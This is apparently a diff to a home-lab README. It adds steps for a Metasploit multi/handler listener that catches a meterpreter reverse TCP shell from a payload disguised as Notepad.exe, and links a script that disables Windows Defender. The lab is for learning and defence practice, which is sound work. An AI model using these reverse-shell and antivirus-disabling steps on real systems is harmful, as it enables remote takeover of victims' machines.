@@ -80,7 +80,17 @@ LHOST = The IP address of your Kali VM, Notepad.exe is our generated filename wh
 
 ---
 ## Windows Defender
-- In order to use msfvenom payloads on our Windows VM we must disable Windows Defender.
-Using msfvenom without obfuscation of our payload will be easily detected by antivirus software. For the simplicity and learning of payload functions and detections I will not attempt to obfuscate or evade antivirus.   
+- In order to use msfvenom payloads on our Windows VM we must disable Windows Defender.  
+Using msfvenom without obfuscation of our payload will be easily detected by antivirus software.  
+For the simplicity and learning of payload functions and detections I will not attempt to obfuscate or evade antivirus.  
 On our Windows VM, using the [Defender](https://github.com/Trn44/SOC-Home-Lab/raw/main/Defender.ps1) PowerShell script we can 1 click disable all Windows Defender components.  
-Disabling defender when simulating an attack in a closed LAN environment is safe as we are not open to any vulnerabilities which can be used over an open network connection, only our own attacks.  
+Disabling defender when simulating an attack in a closed LAN environment is safe as we are not open to any vulnerabilities which can be used over an open network connection, only our own attacks.
+
+---
+## Opening Metasploit listener
+- Using Metasploit we can set our Kali VM to be the listener for our payload to generate our reverse tcp shellcode and recieve information from our Windows VM.  
+In the terminal we can type "msfconsole" to load Metasploit.  
+Next we can setup a multi handler through the command "user exploit/multi/handler".  
+The defualt payload option is set to generic/shell_reverse_tcp, to change it we can use "set payload windows/x64/meterpreter/reverse_tcp" to match our payload type we previously generated in Notepad.exe.  
+Setting the lhost to our Kali VM IP is required in order to recieve the reverse TCP shell back from the Windows VM, we do this through the command "set lhost 192.168.0.200".  
+To check the setup we can use "options" to view our changes.  
